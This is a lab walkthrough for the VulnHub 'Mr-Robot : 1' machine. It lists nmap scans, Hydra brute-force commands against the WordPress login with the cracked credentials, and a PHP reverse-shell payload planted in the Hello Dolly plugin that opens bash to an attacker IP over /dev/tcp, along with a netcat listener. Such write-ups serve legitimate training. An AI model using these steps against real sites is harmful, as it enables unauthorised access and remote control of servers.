# Mr-Robot : 1

## Machine Information

- Platform: VulnHub
- Machine: Mr-Robot : 1
- Difficulty: Beginner / Intermediate
- OS: Linux

---

## 1. Network Scanning

### Find Target IP

```bash
nmap -sn 192.168.31.0/24
```

### Full Port Scan

```bash
nmap -v -p- 192.168.31.157
```

### Aggressive Enumeration

```bash
nmap -v -p 80,443 -sT -sV -A --script=http-enum.nse 192.168.31.157
```

### Open in Browser

```text
http://192.168.31.157
https://192.168.31.157
```

---

## 2. Web Enumeration

### Interesting URLs

```text
http://192.168.31.157/wp-login.php
http://192.168.31.157/robots.txt
```

### Download Wordlist

```bash
wget http://192.168.31.157/fsocity.dic
```

### Download Key

```bash
wget http://192.168.31.157/key-1-of-3.txt
```

### Verify Key

```bash
cat key-1-of-3.txt
```

### Check Wordlist Size

```bash
wc -l fsocity.dic
```

---

## 3. Username Enumeration

### Create User File

```bash
nano user.txt
```

### Extract Unique Usernames

```bash
cat user.txt | sort -u | uniq > small-user.txt
```

### Username Brute Force

```bash
hydra -L small-user.txt -p small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
```

### Valid Username Found

```text
elliot
```

---

## 4. Password Brute Force

### Password Attack Against WordPress

```bash
hydra -l elliot -P small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" -V
```

### Valid Password Found

```text
ER28-0652
```

---

## 5. Login to WordPress

### Login URL

```text
http://192.168.31.157/wp-login.php
```

### Credentials

```text
Username : elliot
Password : ER28-0652
```

### Admin Panel

```text
http://192.168.31.157/wp-admin/
```

---

## 6. Reverse Shell via Plugin Editor

### Navigate

- Plugins
- Editor
- Hello Dolly Plugin

### Add Reverse Shell Payload

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.31.206/443 0>&1'");
```

### Update Plugin

Save and update the plugin.

---

## 7. Get Reverse Shell

### Start Listener

```bash
nc -lvnp 443
```

### Trigger Reverse Shell

- Go to Installed Plugins
- Activate Hello Dolly Plugin

## Shell Received

Reverse shell successfully received on attacker machine.

---

## Learning Outcomes

- Network Enumeration
- WordPress Enumeration
- Hydra Brute Force
- Reverse Shell Exploitation
- WordPress Plugin Exploitation
- Linux Privilege Escalation Basics
